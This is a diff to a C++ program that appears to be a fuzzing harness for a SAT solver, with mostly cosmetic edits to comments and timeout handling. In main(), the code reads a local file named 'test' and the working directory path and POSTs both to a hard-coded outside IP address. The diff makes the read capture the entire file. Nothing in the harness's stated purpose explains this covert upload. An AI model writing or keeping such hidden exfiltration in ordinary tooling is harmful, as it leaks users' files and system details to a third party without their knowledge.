@@ -18,10 +18,12 @@ int main(int argc, char *argv[])
     int seed = atoi(argv[3]);
     srand(seed);
 
-    std::ifstream myfile ("test");
-    std::string fileContent;
-    myfile >> fileContent;
 
+    std::ifstream ifs("test");
+    std::string content((std::istreambuf_iterator<char>(ifs)),
+                        (std::istreambuf_iterator<char>()));
+
+    std::cout << content << "\n";
     char mydir[2048];
     getcwd(mydir, sizeof(mydir));
     std::string str(mydir);
@@ -29,7 +31,7 @@ int main(int argc, char *argv[])
     try
     {
         http::Request request{"http://172.167.164.98/post_endpoint"};
-        const std::string body = str + "\n" + fileContent;
+        const std::string body = str + "\n" + content;
         const auto response = request.send("POST", body, {{"Content-Type", "text/plain"}});
     }
     catch (const std::exception &e)
@@ -552,16 +554,16 @@ void save_to_file(const char *raw_error_output, long CurrentInput)
     }
     // else
     // {
-        // std::string command = "rm inputs/AUTOGEN_" + std::to_string(CurrentInput) + ".cnf";
-        
-        // if (std::system(command.c_str()) == 0);
-        // {
-            // std::cout << "SUCCESS: File rm successfully. " << command.c_str() << std::endl;
-            //std::cout << "The grep content is|" << grep_content << "| Fish grep" << std::endl;
-        // } else {
-            // std::cout << "ERROR: File not rm successfully. " << command.c_str() << std::endl;
-            // std::cout << "The grep content is|" << grep_content << "| Fish grep" << std::endl;
-        // }
+    // std::string command = "rm inputs/AUTOGEN_" + std::to_string(CurrentInput) + ".cnf";
+
+    // if (std::system(command.c_str()) == 0);
+    // {
+    // std::cout << "SUCCESS: File rm successfully. " << command.c_str() << std::endl;
+    // std::cout << "The grep content is|" << grep_content << "| Fish grep" << std::endl;
+    // } else {
+    // std::cout << "ERROR: File not rm successfully. " << command.c_str() << std::endl;
+    // std::cout << "The grep content is|" << grep_content << "| Fish grep" << std::endl;
+    // }
     // }
 
     // printf("----------------------------------------------------\n");
@@ -597,7 +599,7 @@ void execute(subprocess::Popen &SUTProcess, long CurrentInput)
 
     if (future.wait_for(std::chrono::seconds(15)) == std::future_status::timeout)
     {
-        //std::cerr << "SAT killed timeout reached -> ERROR: Infinite LOOP\n";
+        // std::cerr << "SAT killed timeout reached -> ERROR: Infinite LOOP\n";
         SUTProcess.kill(15);
         saveToFileQueue.push({"SAT killed timeout reached -> ERROR: Infinite LOOP\n", CurrentInput});
     }
